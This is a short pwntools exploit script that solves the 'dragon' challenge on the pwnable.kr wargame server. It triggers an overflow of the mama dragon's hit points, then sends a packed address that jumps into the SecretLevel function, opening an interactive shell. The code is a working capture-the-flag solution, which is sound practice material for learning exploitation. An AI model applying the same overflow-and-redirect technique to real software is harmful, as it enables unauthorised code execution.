from pwn import *

exe = ELF("./dragon", checksec=True)

context.binary = exe

HOST = "pwnable.kr"
PORT = 10023

gdbscript = """
set follow-fork-mode child
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def lose_against_baby(r):
    r.sendlineafter(b"Knight\n", b"2")
    r.sendlineafter(b"HP.\n", b"2")

def overflow_mama_hp(r):
    r.sendlineafter(b"Knight\n", b"1")

    for i in range(4):
        r.sendline(b"3")
        r.sendlineafter(b"Invincible.\n", b"3")
        r.sendlineafter(b"Invincible.\n", b"2")
    
def main():
    r  = conn()
    
    lose_against_baby(r)
    overflow_mama_hp(r)
    
    r.sendline(pack(exe.symbols.SecretLevel + 0x47))
    r.interactive()

if __name__ == "__main__":
    main()
